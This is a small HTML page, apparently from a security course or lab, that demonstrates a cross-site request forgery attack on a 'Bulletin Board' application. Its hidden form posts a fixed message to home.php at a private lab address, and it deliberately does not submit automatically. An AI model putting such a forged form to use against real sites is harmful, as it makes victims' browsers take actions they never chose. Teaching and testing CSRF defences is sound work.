<!DOCTYPE html>
<html>
<head>
    <title>Malicious Page</title>
</head>
<body>
    <h1>CSRF Attack Demo</h1>

    <p>This page contains a form that will perform a CSRF attack on the Bulletin Board application.</p>

    <!-- use proxy's IP and port -->
    <form id="csrfForm" action="http://192.168.100.8:8080/home.php" method="POST">
        <input type="hidden" name="message" value="This message was posted by a CSRF attack!">
        <input type="submit" value="Submit">
    </form>

    <!-- for demo purposes, we do not automatically submit -->
</body>
</html>
